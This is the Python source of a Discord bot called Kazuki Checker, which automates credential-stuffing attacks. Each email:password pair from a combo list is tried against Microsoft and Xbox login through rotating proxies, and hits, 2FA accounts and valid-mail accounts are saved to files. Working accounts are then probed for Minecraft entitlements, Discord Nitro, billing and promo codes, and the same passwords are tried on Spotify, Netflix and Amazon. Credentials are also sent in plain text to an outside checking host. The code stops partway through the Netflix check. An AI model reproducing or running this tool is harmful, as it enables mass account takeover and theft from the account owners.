"""
Kazuki Checker Bot — by Kazuki
Owner: 1131420466280669274
"""
import discord
from discord import ui
from discord.ext import commands
import asyncio, os, sys, json, time, threading, zipfile, io, shutil, tempfile
import requests, re, urllib3, warnings, uuid, random, socket
import concurrent.futures
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs
from collections import deque
import threading

thread_local = threading.local()

urllib3.disable_warnings()
warnings.filterwarnings("ignore")

# ── Constants ─────────────────────────────────────────────────────────────────
OWNER_ID   = 1131420466280669274
TOKEN = os.environ.get("DISCORD_TOKEN")
DATA_FILE  = "data/bot_data.json"
RESULTS_BASE = "results"
COMBOS_DIR   = "data/combos"
PROXIES_DIR  = "data/proxies"
TIMEOUT    = 14
_UA        = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
              "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
_MS_URL    = ("https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328"
              "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
              "&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch"
              "&response_type=token&locale=en")

for d in ["data", COMBOS_DIR, PROXIES_DIR, RESULTS_BASE]: os.makedirs(d, exist_ok=True)

# ── Persistent data ───────────────────────────────────────────────────────────
def load_data():
    default_data = {"whitelist":[], "combos":{}, "settings":{}, "enabled_channels":[]}
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE) as f:
                loaded = json.load(f)
                if isinstance(loaded, dict):
                    for k, v in default_data.items():
                        loaded.setdefault(k, v)
                    return loaded
        except: pass
    return default_data

def save_data(d):
    os.makedirs("data", exist_ok=True)
    with open(DATA_FILE,"w") as f: json.dump(d, f, indent=2)

bot_data = load_data()


def is_enabled_channel(ch_id):
    """Return True if this channel has bot enabled."""
    try:
        target = int(ch_id)
        for x in bot_data.get("enabled_channels", []):
            try:
                if int(x) == target:
                    return True
            except ValueError:
                pass
    except ValueError:
        pass
    return False

def toggle_channel(ch_id, enable: bool):
    ch_id = int(ch_id)
    lst = [int(x) for x in bot_data.get("enabled_channels", [])]
    if enable:
        if ch_id not in lst: lst.append(ch_id)
    else:
        if ch_id in lst: lst.remove(ch_id)
    bot_data["enabled_channels"] = lst
    save_data(bot_data)

def is_allowed(message):
    """Check if bot should respond in this context."""
    if isinstance(message.channel, discord.DMChannel):
        return is_wl(message.author.id)
    return is_enabled_channel(message.channel.id) and is_wl(message.author.id)

def is_owner(uid):        return int(uid) == OWNER_ID
def is_wl(uid):           return is_owner(uid) or int(uid) in bot_data.get("whitelist",[])

# ── Bot ───────────────────────────────────────────────────────────────────────
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=["x", "X"], intents=intents, help_command=None)

# Monkey-patch discord.abc.Messageable.send for Components V2
_original_send = discord.abc.Messageable.send

async def _cv2_send(self, content=None, *, tts=False, embed=None, embeds=None, file=None, files=None, stickered=None, delete_after=None, nonce=None, allowed_mentions=None, reference=None, mention_author=None, view=None, suppress_embeds=False, silent=False, poll=None, **kwargs):
    # Only wrap if there is content, no view provided, and no embeds/polls
    if view is None and content is not None and not embed and not embeds and not poll:
        layout = ui.LayoutView()
        container = ui.Container(accent_color=discord.Colour.from_rgb(0, 170, 255))
        container.add_item(ui.TextDisplay(str(content)))
        layout.add_item(container)
        return await _original_send(self, view=layout, file=file, files=files, delete_after=delete_after, reference=reference, **kwargs)
    return await _original_send(self, content=content, tts=tts, embed=embed, embeds=embeds, file=file, files=files, delete_after=delete_after, nonce=nonce, allowed_mentions=allowed_mentions, reference=reference, mention_author=mention_author, view=view, **kwargs)

discord.abc.Messageable.send = _cv2_send

# session stores
active_sessions  = {}   # uid -> CheckSession
pending_sessions = {}   # uid -> setup state dict
proxy_check_jobs = {}   # uid -> ProxyCheckJob

# ── Versions ──────────────────────────────────────────────────────────────────
VERSIONS = {
    "v1": {"name":"v1 — Original",   "emoji":"🔵",
           "desc":"MS auth + MC entitlement check only.\nHits, Bad, 2FA, Valid Mail, XGPU, XGP, Other."},
    "v2": {"name":"v2 — Standard",   "emoji":"🟡",
           "desc":"v1 + Hypixel, Optifine, Email access (SFA/MFA), Name change, Hypixel ban."},
    "v3": {"name":"v3 — Pro",        "emoji":"🟠",
           "desc":"v2 + Discord Nitro, Promos (EA/PC/3mo/1mo), Billing, Boosts, Friends, Age, Migration."},
    "v4": {"name":"v4 — Ultimate",   "emoji":"🔴",
           "desc":"v3 + Spotify, Netflix (plan), Amazon Prime, per-check hit/bad counters, rolling CPM, ETA."},
}

CHECKER_MODULES = {
    "nitro":     True, "promos":    True, "billing":   True,
    "boosts":    True, "friends":   True, "migration": True,
    "spotify":   True, "netflix":   True, "prime":     True,
    "hypixel":   True, "optifine":  True, "namechange":True,
    "hypixelban":True, "donut":     True,
}

def get_disabled(uid):
    return bot_data.get("settings",{}).get(str(uid),{}).get("disabled",[])

def set_disabled(uid, lst):
    bot_data.setdefault("settings",{})[str(uid)] = {"disabled": lst}
    save_data(bot_data)

# ══════════════════════════════════════════════════════════════════════════════
#  AUTH ENGINE
# ══════════════════════════════════════════════════════════════════════════════

def get_thread_session(proxy=None):
    if not hasattr(thread_local, "session"):
        s = requests.Session()
        s.verify = False
        s.headers.update({"User-Agent": _UA})
        adapter = requests.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=50, max_retries=1)
        s.mount("http://", adapter)
        s.mount("https://", adapter)
        thread_local.session = s
    
    s = thread_local.session
    if proxy:
        s.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    else:
        s.proxies = {}
    return s

def _fetch_login_page(session, proxy_list=None):
    for _ in range(6):
        try:
            r = session.get(_MS_URL, timeout=TIMEOUT)
            t = r.text
            ppft = None
            for pat in [
                r'name="PPFT"[^>]+value="([^"]+)"',
                r'value="([^"]+)"[^>]+name="PPFT"',
                r'name=\\?["\']PPFT\\?["\'][^>]+value=\\?["\']([^"\']+)[\\]?["\']'
            ]:
                m = re.search(pat, t)
                if m: ppft = m.group(1); break
            urlPost = None
            for pat in [r'"urlPost":"([^"]+)"', r"urlPost:'([^']+)'"]:
                m = re.search(pat, t)
                if m:
                    urlPost = m.group(1).replace("\\u0026","&").replace("\\/","/")
                    break
            if ppft and urlPost:
                return urlPost, ppft
        except: pass
        if proxy_list:
            p = random.choice(proxy_list)
            session.proxies = {"http":f"http://{p}","https":f"http://{p}"}
        time.sleep(0.4)
    return None, None

def _post_creds(session, email, password, urlPost, ppft, proxy_list=None):
    for _ in range(4):
        try:
            r = session.post(urlPost,
                data={"login":email,"loginfmt":email,"passwd":password,"PPFT":ppft},
                headers={"Content-Type":"application/x-www-form-urlencoded","Referer":_MS_URL},
                allow_redirects=True, timeout=TIMEOUT)
            url = r.url; txt = r.text; frag = urlparse(url).fragment
            if frag:
                tok = parse_qs(frag).get("access_token",[""])[0]
                if tok: return "TOKEN", tok
            if any(v in url or v in txt for v in [
                "account.live.com/recover","account.live.com/identity","account.live.com/Proofs",
                "Email/Confirm","/Abuse?mkt","recover?mkt=","account.live.com/reauth",
                "Verify your identity","account.live.com/securityinfo"]):
                return "2FA", None
            if "cancel?mkt=" in txt:
                try:
                    d2={}
                    for k in ["ipt","pprid","uaid"]:
                        m=re.search(f'name="{k}"[^>]*value="([^"]+)"',txt)
                        if m: d2[k]=m.group(1)
                    am=re.search(r'id="fmHF" action="([^"]+)"',txt)
                    if am:
                        ret=session.post(am.group(1),data=d2,allow_redirects=True,timeout=TIMEOUT)
                        mu=re.search(r'"recoveryCancel":{"returnUrl":"([^"]+)"',ret.text)
                        if mu:
                            fin=session.get(mu.group(1),allow_redirects=True,timeout=TIMEOUT)
                            tok=parse_qs(urlparse(fin.url).fragment).get("access_token",[""])[0]
                            if tok: return "TOKEN", tok
                except: pass
            if any(v in txt.lower() for v in ["password is incorrect","account doesn't exist",
                "tried to sign in too many","account has been locked","no account found",
                "that microsoft account doesn","this username may be incorrect"]):
                return "BAD", None
        except: pass
        if proxy_list:
            p = random.choice(proxy_list)
            session.proxies = {"http":f"http://{p}","https":f"http://{p}"}
        time.sleep(0.5)
    return "BAD", None

def _xbox_auth(session, rps):
    for _ in range(3):
        try:
            r = session.post("https://user.auth.xboxlive.com/user/authenticate",
                json={"Properties":{"AuthMethod":"RPS","SiteName":"user.auth.xboxlive.com",
                      "RpsTicket":"t="+rps},
                      "RelyingParty":"http://auth.xboxlive.com","TokenType":"JWT"},
                headers={"Content-Type":"application/x-www-form-urlencoded","User-Agent":_UA},
                timeout=TIMEOUT)
            if r.status_code==200:
                js=r.json(); tok=js.get("Token","")
                uhs=js.get("DisplayClaims",{}).get("xui",[{}])[0].get("uhs","")
                if tok and uhs: return tok, uhs
            elif r.status_code==401: return None, None
        except: pass
        time.sleep(0.4)
    return None, None

def _xsts_auth(session, xbox):
    for _ in range(3):
        try:
            r = session.post("https://xsts.auth.xboxlive.com/xsts/authorize",
                json={"Properties":{"SandboxId":"RETAIL","UserTokens":[xbox]},
                      "RelyingParty":"rp://api.minecraftservices.com/","TokenType":"JWT"},
                headers={"Content-Type":"application/json","Accept":"application/json","User-Agent":_UA},
                timeout=TIMEOUT)
            if r.status_code==200:
                tok=r.json().get("Token","")
                if tok: return tok
            elif r.status_code==401: return None
        except: pass
        time.sleep(0.4)
    return None

def _mc_token(session, uhs, xsts):
    for _ in range(3):
        try:
            r = session.post("https://api.minecraftservices.com/authentication/login_with_xbox",
                json={"identityToken":"XBL3.0 x="+uhs+";"+xsts},
                headers={"Content-Type":"application/json","User-Agent":_UA}, timeout=TIMEOUT)
            if r.status_code==200:
                tok=r.json().get("access_token","")
                if tok: return tok
            elif r.status_code==429: time.sleep(3); continue
        except: pass
        time.sleep(0.3)
    return None

def _get_entitlements(session, access):
    for _ in range(3):
        try:
            r = session.get("https://api.minecraftservices.com/entitlements/mcstore",
                headers={"Authorization":"Bearer "+access,"User-Agent":_UA}, timeout=TIMEOUT)
            if r.status_code==200: return r.text
            elif r.status_code==429: time.sleep(3); continue
        except: pass
        time.sleep(0.3)
    return ""

def _get_mc_profile(session, access):
    for _ in range(3):
        try:
            r = session.get("https://api.minecraftservices.com/minecraft/profile",
                headers={"Authorization":"Bearer "+access,"User-Agent":_UA}, timeout=TIMEOUT)
            if r.status_code==200:
                d=r.json()
                if isinstance(d, dict):
                    capes=", ".join(c.get("alias","") for c in d.get("capes",[]))
                    return d.get("name","N/A"), d.get("id","N/A"), capes
            elif r.status_code==404: return None,None,None
            elif r.status_code==429: time.sleep(3); continue
        except: pass
        time.sleep(0.3)
    return None,None,None

def _full_auth(email, password, proxy_list=None):
    """Returns (status, actype, name, uid, capes, access_token) or (status, None*5)"""
    proxy = random.choice(proxy_list) if proxy_list else None
    session = get_thread_session(proxy)
    session.cookies.clear()

    urlPost, ppft = _fetch_login_page(session, proxy_list)
    if not urlPost: return "ERROR", None,None,None,None,None

    status, rps = _post_creds(session, email, password, urlPost, ppft, proxy_list)

    if status == "2FA":  return "2FA",  None,None,None,None,None
    if status != "TOKEN": return "BAD",  None,None,None,None,None

    xbox, uhs = _xbox_auth(session, rps)
    if not xbox: return "BAD", None,None,None,None,None

    xsts = _xsts_auth(session, xbox)
    if not xsts: return "BAD", None,None,None,None,None

    access = _mc_token(session, uhs, xsts)
    if not access: return "BAD", None,None,None,None,None

    ents = _get_entitlements(session, access)

    if "product_game_pass_ultimate" in ents: actype = "XGPU"
    elif "product_game_pass_pc"      in ents: actype = "XGP"
    elif '"product_minecraft"'        in ents: actype = "Normal"
    else:
        others=[x for x,k in [("Bedrock","product_minecraft_bedrock"),
                                ("Legends","product_legends"),
                                ("Dungeons","product_dungeons")] if k in ents]
        actype = ("Other:"+",".join(others)) if others else "VM"

    if actype == "VM": return "VM", "VM", None, None, None, access

    name, uid, capes = _get_mc_profile(session, access)
    return "HIT", actype, name or "N/A", uid or "", capes or "", access

# ══════════════════════════════════════════════════════════════════════════════
#  EXTRA CHECKS
# ══════════════════════════════════════════════════════════════════════════════

def _check_email_access(session, email, password):
    try:
        r = session.get(f"https://email.avine.tools/check?email={email}&password={password}", timeout=TIMEOUT)
        return r.json().get("Success")==1
    except: return None

def _check_nitro(session, token):
    try:
        r = session.get("https://discord.com/api/v9/users/@me",
            headers={"Authorization":token}, timeout=TIMEOUT)
        if r.status_code==200:
            pt = r.json().get("premium_type",0)
            return {0:"None",1:"Classic",2:"Nitro",3:"Basic"}.get(pt,f"Type{pt}")
    except: pass
    return None

def _check_promos(session, token):
    try:
        r = session.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes",
            headers={"Authorization":token}, timeout=TIMEOUT)
        if r.status_code==200:
            promos=[]
            for p in r.json():
                code=p.get("code",""); title=p.get("promotion",{}).get("outbound_title","Unknown")
                link=p.get("promotion",{}).get("outbound_redemption_page_link","")
                promos.append(f"{title}: {link}?code={code}" if link else f"{title}: {code}")
            return promos
    except: pass
    return []

def _check_billing(session, token):
    try:
        r = session.get("https://discord.com/api/v9/users/@me/billing/payment-sources",
            headers={"Authorization":token}, timeout=TIMEOUT)
        if r.status_code==200 and r.json():
            parts=[]
            for m in r.json():
                t=m.get("type")
                if t==1: parts.append(f"{m.get('brand','?').upper()}*{m.get('last_4','????')}")
                elif t==2: parts.append("PayPal")
                else: parts.append(f"Type{t}")
            return ", ".join(parts)
    except: pass
    return None

def _check_boosts(session, token):
    try:
        r = session.get("https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots",
            headers={"Authorization":token}, timeout=TIMEOUT)
        if r.status_code==200:
            avail=sum(1 for s in r.json() if not s.get("cancelled") and not s.get("premium_guild_id"))
            return avail if avail>0 else None
    except: pass
    return None

def _check_friends(session, token):
    try:
        r = session.get("https://discord.com/api/v9/users/@me/relationships",
            headers={"Authorization":token}, timeout=TIMEOUT)
        if r.status_code==200:
            return sum(1 for x in r.json() if x.get("type")==1)
    except: pass
    return None

def _check_migration(session, access):
    try:
        r = session.get("https://api.minecraftservices.com/minecraft/profile/migration",
            headers={"Authorization":"Bearer "+access}, timeout=TIMEOUT)
        if r.status_code==200:
            return "Migrated" if r.json().get("roleMigrated") else "Unmigrated"
        elif r.status_code==404: return "Legacy"
    except: pass
    return None

def _check_hypixel(session, name):
    info = {"name":None,"level":None,"first":None,"last":None,"bwstars":None}
    try:
        tx = session.get(f"https://plancke.io/hypixel/player/stats/{name}",
            headers={"User-Agent":_UA}, timeout=TIMEOUT).text
        def _s(p): m=re.search(p,tx); return m.group() if m else None
        info["name"]    = _s(r'(?<=og:description" content=").+?(?=")')
        info["level"]   = _s(r'(?<=Level:</b> ).+?(?=<br/><b>)')
        info["first"]   = _s(r'(?<=First login: </b>).+?(?=<br/><b>)')
        info["last"]    = _s(r'(?<=Last login: </b>).+?(?=<br/>)')
        info["bwstars"] = _s(r'(?<=<li><b>Level:</b> ).+?(?=</li>)')
    except: pass
    return info

def _check_hypixel_ban(session, access, name, uid):
    """Check Hypixel ban via API approach."""
    try:
        r = session.get(f"https://api.hypixel.net/player?name={name}",
            headers={"API-Key":"00000000-0000-0000-0000-000000000000"}, timeout=TIMEOUT)
        if r.status_code==200:
            return None  # can't tell without valid key
    except: pass
    return "Unknown"

def _check_donut(session, name):
    """Check DonutSMP ban/balance/shards/playtime."""
    result = {"banned":None,"balance":None,"shards":None,"playtime":None}
    try:
        r = session.get(f"https://api.donutsmp.net/v1/player/{name}",
            timeout=TIMEOUT, headers={"User-Agent":_UA})
        if r.status_code==200:
            d=r.json()
            if isinstance(d, dict):
                result["banned"]   = str(d.get("banned", False))
                result["balance"]  = str(d.get("balance","N/A"))
                result["shards"]   = str(d.get("shards","N/A"))
                pt = d.get("playtime",0)
                if pt:
                    h=pt//3600; m=(pt%3600)//60
                    result["playtime"] = f"{h}h {m}m" if h else f"{m}m"
    except: pass
    return result

def _check_optifine(session, name):
    try:
        r = session.get(f"http://s.optifine.net/capes/{name}.png", timeout=8)
        return "No" if "Not found" in r.text else "Yes"
    except: return None

def _check_namechange(session, access):
    try:
        r = session.get("https://api.minecraftservices.com/minecraft/profile/namechange",
            headers={"Authorization":"Bearer "+access}, timeout=TIMEOUT)
        if r.status_code==200:
            d=r.json()
            if isinstance(d, dict):
                can=str(d.get("nameChangeAllowed","?"))
                ca=d.get("createdAt","")
                if ca:
                    try: gd=datetime.strptime(ca,"%Y-%m-%dT%H:%M:%S.%fZ")
                    except: gd=datetime.strptime(ca,"%Y-%m-%dT%H:%M:%SZ")
                    gd=gd.replace(tzinfo=timezone.utc)
                    diff=datetime.now(timezone.utc)-gd
                    y=diff.days//365; mo=(diff.days%365)//30
                    age = f"{y}yr" if y>0 else (f"{mo}mo" if mo>0 else f"{diff.days}d")
                    return can, age
                return can, None
    except: pass
    return None, None

def _check_spotify(session, email, password):
    try:
        session.cookies.clear()
        r0=session.get("https://accounts.spotify.com/en/login",headers={"User-Agent":_UA},timeout=TIMEOUT)
        csrf=re.search(r'name="csrf_token" value="(.+?)"',r0.text)
        r=session.post("https://accounts.spotify.com/api/login",
            data={"remember":False,"username":email,"password":password,
                  "csrf_token":csrf.group(1) if csrf else ""},
            headers={"User-Agent":_UA,"Referer":"https://accounts.spotify.com/en/login",
                     "Content-Type":"application/x-www-form-urlencoded",
                     "X-CSRF-Token":csrf.group(1) if csrf else ""},
            timeout=TIMEOUT, allow_redirects=False)
        body=r.json() if "application/json" in r.headers.get("Content-Type","") else {}
        if r.status_code==200 and isinstance(body, dict) and body.get("displayName"): return "Hit"
        return "Bad"
    except: return "Error"

def _check_netflix(session, email, password):
    try:
        session.cookies.clear()
        r0=session.get("https://www.netflix.com/login",timeout=TIMEOUT)
        auth_m=re.search(r'"authURL":"(.+?)"',r0.text)
        if not auth_m: return "Error"
        r=session.post("https://www.netflix.com/login",data={
            "userLoginId":email,"password":password,"authURL":auth_m.group(1),
            "rememberMe":"false","flow":"websiteSignUp","mode":"login",
            "action":"loginAction","withFields":"rememberMe,nextPage,userLoginId,password,countryCode,countryCode,currentCountry"
        },headers={"Content-Type":"application/x-www-form-urlencoded"},timeout=TIMEOUT,allow_redirects=True)
        if "membercenter" in r.url or "browse" in r.url or "YourAccount" in r.text:
            pm=re.search(r'"planName":"(.+?)"',r.text)
            return f"Hit | {pm.group(1)}" if pm else "Hit"
        return "Bad"
    except: return "Error"

def _check_prime(session, email, password):
    try:
        session.cookies.clear()
        r0=session.get("https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0"
            "&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F"
            "&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select"
            "&openid.assoc_handle=usflex&openid.mode=checkid_setup"
            "&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select"
            "&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0",timeout=TIMEOUT)
        def _re(p): m=re.search(p,r0.text); return m.group(1) if m else ""
        r=session.post("https://www.amazon.com/ap/signin",data={
            "appActionToken":_re(r'name="appActionToken" value="(.+?)"'),
            "appAction":"SIGNIN","openid.return_to":"","prevRID":"",
            "workflowState":_re(r'name="workflowState" value="(.+?)"'),
            "email":email,"password":password,"create":"0"
        },headers={"Content-Type":"application/x-www-form-urlencoded"},timeout=TIMEOUT,allow_redirects=True)
        if 'nav-link-accountList' in r.text or 'Hello,' in r.text:
            return "Hit | Prime" if ("primeus" in r.text or "PRIME" in r.text.upper()) else "Hit | No Prime"
        return "Bad"
    except: return "Error"

# ══════════════════════════════════════════════════════════════════════════════
#  CHECK SESSION
# ══════════════════════════════════════════════════════════════════════════════

class CheckSession:
    def __init__(self, uid, session_id, combos, version, proxy_list, disabled):
        self.uid        = uid
        self.session_id = session_id
        self.combos     = combos
        self.version    = version
        self.proxy_list = proxy_list
        self.disabled   = disabled   # list of disabled module names
        self.running    = True
        self.paused     = False
        self.start_time = time.time()
        self._lock      = threading.Lock()
        self._cpm_q     = deque(maxlen=300)
        self.maxretries = 3

        # result dir with category subfolders
        self.rdir = os.path.join(RESULTS_BASE, f"{uid}_{session_id}")
        for sub in ["hits","bad","2fa","valid_mail","captures","extras"]:
            os.makedirs(os.path.join(self.rdir, sub), exist_ok=True)

        self.C = {k:0 for k in [
            "hits","bad","twofa","checked","errors","retries","vm","sfa","mfa",
            "xgp","xgpu","other","nitro_hit","nitro_none","promo_hit","promo_bad",
            "promo_ea","promo_pc","promo_3m","promo_1m","promo_other",
            "spotify_hit","spotify_bad","netflix_hit","netflix_bad",
            "prime_hit","prime_bad","billing_hit","billing_bad","boost_hit",
            "migrated","unmigrated","legacy",
        ]}

        # live results for xsget
        self.recent_hits = deque(maxlen=50)
        self.recent_2fa  = deque(maxlen=50)
        self.recent_vm   = deque(maxlen=50)

    def _inc(self, **kw):
        with self._lock:
            for k,v in kw.items():
                if k in self.C: self.C[k]+=v

    def _tick(self):
        with self._lock: self._cpm_q.append(time.time())

    def cpm(self):
        now=time.time()
        with self._lock: return len([t for t in self._cpm_q if now-t<=60])

    def eta(self):
        el=time.time()-self.start_time; done=self.C["checked"]; total=len(self.combos)
        if done<3 or el<1: return "calculating…"
        rate=done/el; left=(total-done)/rate if rate>0 else 0
        if left<60: return f"{int(left)}s"
        if left<3600: return f"{int(left//60)}m {int(left%60)}s"
        return f"{int(left//3600)}h {int((left%3600)//60)}m"

    def _write(self, subfolder, filename, line):
        path = os.path.join(self.rdir, subfolder, filename)
        with self._lock:
            with open(path,'a',encoding='utf-8') as f: f.write(line+"\n")

    def _is_disabled(self, module):
        return module in self.disabled

    def stats_layout(self):
        c=self.C; total=len(self.combos); done=c["checked"]
        pct = max(0.0, min(1.0, done / total if total else 0.0))
        bar="█"*int(18*pct)+"░"*(18-int(18*pct))
        ver=VERSIONS.get(self.version,{}).get("name",self.version.upper())
        state="▶️ Running" if (self.running and not self.paused) else ("⏸️ Paused" if self.paused else "✅ Done")
        color=discord.Colour.from_rgb(0, 255, 0) if (self.running and not self.paused) else (discord.Colour.from_rgb(255, 170, 0) if self.paused else discord.Colour.from_rgb(0, 153, 255))

        layout = ui.LayoutView()
        container = ui.Container(accent_color=color)

        container.add_item(ui.TextDisplay("# 👻 Kazuki Live Stats"))
        container.add_item(ui.Separator())

        container.add_item(ui.TextDisplay(
            f"### 📊 Progress\n"
            f"`[{bar}]` **{pct*100:.1f}%**\n"
            f"> Checked: `{done}` / `{total}`  •  ⚡ CPM: `{self.cpm()}`  •  ⏳ ETA: `{self.eta()}`\n"
            f"-# 🆔 Session: `{self.session_id}`  •  🔢 Version: **{ver}**  •  ⚙️ State: **{state}**"
        ))

        container.add_item(ui.Separator())

        container.add_item(ui.TextDisplay(
            f"### 🎯 Results Summary\n"
            f"✅ **Hits:** `{c['hits']}`  •  ❌ **Bad:** `{c['bad']}`  •  📧 **VM:** `{c['vm']}`\n"
            f"🔒 **2FA:** `{c['twofa']}`  •  🛡️ **SFA:** `{c['sfa']}`  •  🔑 **MFA:** `{c['mfa']}`\n"
            f"🎮 **XGPU:** `{c['xgpu']}`  •  🎮 **XGP:** `{c['xgp']}`  •  📦 **Other:** `{c['other']}`"
        ))

        container.add_item(ui.Separator())

        container.add_item(ui.TextDisplay(
            f"### 💎 Services & Subscriptions\n"
            f"💎 **Nitro:** ✅ `{c['nitro_hit']}`  •  ❌ `{c['nitro_none']}`\n"
            f"🎁 **Promos:** ✅ `{c['promo_hit']}`  •  ❌ `{c['promo_bad']}`\n"
            f"> EA: `{c['promo_ea']}`  •  PC: `{c['promo_pc']}`  •  3m: `{c['promo_3m']}`  •  1m: `{c['promo_1m']}`\n"
            f"💳 **Billing:** ✅ `{c['billing_hit']}`  •  ❌ `{c['billing_bad']}`  •  🚀 **Boosts:** `{c['boost_hit']}`\n"
            f"🎵 **Spotify:** `{c['spotify_hit']}`  •  🎬 **Netflix:** `{c['netflix_hit']}`  •  📦 **Prime:** `{c['prime_hit']}`\n"
            f"🔄 **Migration:** Migrated: `{c['migrated']}`  •  Unmigrated: `{c['unmigrated']}`  •  Legacy: `{c['legacy']}`\n"
            f"⚙️ **Meta:** 🔁 Retries: `{c['retries']}`  •  ⚠️ Errors: `{c['errors']}`"
        ))

        layout.add_item(container)
        return layout

    def process(self, combo):
        if not self.running: return
        while self.paused and self.running: time.sleep(0.3)
        if not self.running: return
        combo=combo.strip()
        if not combo or ":" not in combo:
            self._inc(bad=1,checked=1); self._tick(); return
        parts=combo.split(":",1)
        email,pw=parts[0].strip().lower(),parts[1].strip()
        if not email or not pw or "@" not in email:
            self._inc(bad=1,checked=1); self._tick(); return
        self._run(email, pw)

    def _run(self, email, pw):
        status, actype, name, uid, capes, access = _full_auth(email, pw, self.proxy_list or None)
        session = get_thread_session()

        if status=="ERROR":
            self._inc(errors=1,bad=1,checked=1); self._tick()
            self._write("bad","errors.txt",f"{email}:{pw}")
            return
        if status=="2FA":
            self._inc(twofa=1,checked=1); self._tick()
            self._write("2fa","2fa.txt",f"{email}:{pw}")
            self.recent_2fa.append({"email":email,"pw":pw,"time":time.strftime("%H:%M:%S")})
            return
        if status=="BAD":
            self._inc(bad=1,checked=1); self._tick()
            self._write("bad","bad.txt",f"{email}:{pw}")
            return
        if status=="VM":
            self._inc(vm=1,checked=1); self._tick()
            self._write("valid_mail","valid_mail.txt",f"{email}:{pw}")
            self.recent_vm.append({"email":email,"pw":pw,"time":time.strftime("%H:%M:%S")})
            # still run email access check
            if not self._is_disabled("email_access"):
                ea=_check_email_access(session,email,pw)
                if ea is True:  self._inc(mfa=1); self._write("extras","MFA.txt",f"{email}:{pw}")
                elif ea is False: self._inc(sfa=1); self._write("extras","SFA.txt",f"{email}:{pw}")
            return

        # ── HIT ────────────────────────────────────────────────────────────────
        self._inc(checked=1); self._tick()
        if actype=="XGPU":   self._inc(xgpu=1); self._write("hits","XGPU.txt",f"{email}:{pw}")
        elif actype=="XGP":  self._inc(xgp=1);  self._write("hits","XGP.txt",f"{email}:{pw}")
        elif actype.startswith("Other"): self._inc(other=1); self._write("hits","Other.txt",f"{email}:{pw} | {actype}")
        else:                self._inc(hits=1);  self._write("hits","Hits.txt",f"{email}:{pw}")
        self._write("hits","AllHits.txt",f"{email}:{pw} | {actype}")

        cap = {"email":email,"pw":pw,"name":name,"uuid":uid,"capes":capes,"type":actype,
               "time":time.strftime("%H:%M:%S")}

        # email access
        if not self._is_disabled("email_access"):
            ea=_check_email_access(session,email,pw)
            if ea is True:   self._inc(mfa=1); self._write("extras","MFA.txt",f"{email}:{pw}"); cap["access"]="MFA"
            elif ea is False: self._inc(sfa=1); self._write("extras","SFA.txt",f"{email}:{pw}"); cap["access"]="SFA"
            else: cap["access"]="Unknown"

        # namechange
        if not self._is_disabled("namechange") and name!="N/A":
            nc,last=_check_namechange(session,access)
            cap["namechange"]=nc; cap["lastchange"]=last

        # migration
        if not self._is_disabled("migration"):
            mg=_check_migration(session,access)
            cap["migration"]=mg
            if mg=="Migrated":   self._inc(migrated=1);   self._write("extras","Migrated.txt",f"{email}:{pw}")
            elif mg=="Unmigrated":self._inc(unmigrated=1); self._write("extras","Unmigrated.txt",f"{email}:{pw}")
            elif mg=="Legacy":   self._inc(legacy=1);     self._write("extras","Legacy.txt",f"{email}:{pw}")

        # hypixel
        if not self._is_disabled("hypixel") and name!="N/A":
            hx=_check_hypixel(session,name)
            cap["hypixel"]=hx.get("name"); cap["hylevel"]=hx.get("level")
            cap["hyfirst"]=hx.get("first"); cap["hylast"]=hx.get("last")
            cap["hybwstars"]=hx.get("bwstars")

        # donut
        if not self._is_disabled("donut") and name!="N/A":
            dn=_check_donut(session,name)
            cap["donut_banned"]=dn["banned"]; cap["donut_bal"]=dn["balance"]
            cap["donut_shards"]=dn["shards"]; cap["donut_pt"]=dn["playtime"]
            if dn["banned"]=="True":
                self._write("extras","DonutBanned.txt",f"{email}:{pw} | {name}")

        # optifine
        if not self._is_disabled("optifine") and name!="N/A":
            cap["optifine"]=_check_optifine(session,name)

        # nitro
        if not self._is_disabled("nitro"):
            nt=_check_nitro(session,access)  # access token used as Discord check fails without Discord token
            cap["nitro"]=nt
            if nt and nt!="None": self._inc(nitro_hit=1); self._write("extras","Nitro.txt",f"{email}:{pw} | {nt}")
            else: self._inc(nitro_none=1)

        # promos
        if not self._is_disabled("promos"):
            pr=_check_promos(session,access)
            cap["promos"]=pr
            if pr:
                self._inc(promo_hit=1)
                for p in pr:
                    tl=p.lower()
                    if "ea" in tl: self._inc(promo_ea=1)
                    elif "pc" in tl: self._inc(promo_pc=1)
                    elif "3" in tl and "month" in tl: self._inc(promo_3m=1)
                    elif "1" in tl and "month" in tl: self._inc(promo_1m=1)
                    else: self._inc(promo_other=1)
                    self._write("extras","Promos.txt",f"{email}:{pw} | {p}")
            else: self._inc(promo_bad=1)

        # billing
        if not self._is_disabled("billing"):
            bl=_check_billing(session,access)
            cap["billing"]=bl
            if bl: self._inc(billing_hit=1); self._write("extras","Billing.txt",f"{email}:{pw} | {bl}")
            else: self._inc(billing_bad=1)

        # boosts
        if not self._is_disabled("boosts"):
            bst=_check_boosts(session,access)
            cap["boosts"]=bst
            if bst: self._inc(boost_hit=1); self._write("extras","Boosts.txt",f"{email}:{pw} | {bst} boosts")

        # friends
        if not self._is_disabled("friends"):
            cap["friends"]=_check_friends(session,access)

        # spotify
        if not self._is_disabled("spotify") and self.version=="v4":
            sp=_check_spotify(session,email,pw)
            cap["spotify"]=sp
            if sp=="Hit": self._inc(spotify_hit=1); self._write("extras","Spotify.txt",f"{email}:{pw}")
            else: self._inc(spotify_bad=1)

        # netflix
        if not self._is_disabled("netflix") and self.version=="v4":
            nf=_check_netflix(session,email,pw)
            cap["netflix"]=nf
